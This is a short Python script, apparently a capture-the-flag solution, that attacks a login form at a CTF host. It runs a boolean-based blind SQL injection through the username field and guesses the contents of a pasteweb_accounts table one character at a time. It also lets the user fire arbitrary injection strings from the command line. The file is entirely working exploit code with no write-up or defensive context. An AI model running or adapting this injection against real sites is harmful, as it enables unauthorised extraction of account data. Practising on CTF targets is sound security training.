import requests
import sys
from bs4 import BeautifulSoup
from time import time
from itertools import count

url = "https://pasteweb.ctf.zoolab.org"
sess = requests.Session()

def test(sqli: str):
    data = {
        "username": sqli,
        "password": "IGldNRiLSejE0grC6xAk",
        "current_time": int(time())
    }

    soup = BeautifulSoup(sess.post(url, data=data).content, "html.parser")

    # Login Failed / Bad Hacker!
    res = soup.find(id="message").find_all("p")[-1].string

    return res == "Bad Hacker!"

def main():
    sqli = str()

    if len(sys.argv) < 2:
        sqli = "' or (select substr(string_agg(user_account, ','), {idx}, 1)='{c}' from pasteweb_accounts) --"
        for i in count(start=1):
            for c in range(33, 128):
                if test(sqli.format(idx=i, c=chr(c))):
                    print(chr(c), end="", flush=True)
                    break
    else:
        sqli = str(sys.argv[1])
        res = test(sqli)
        print(res)

if __name__ == "__main__":
    main()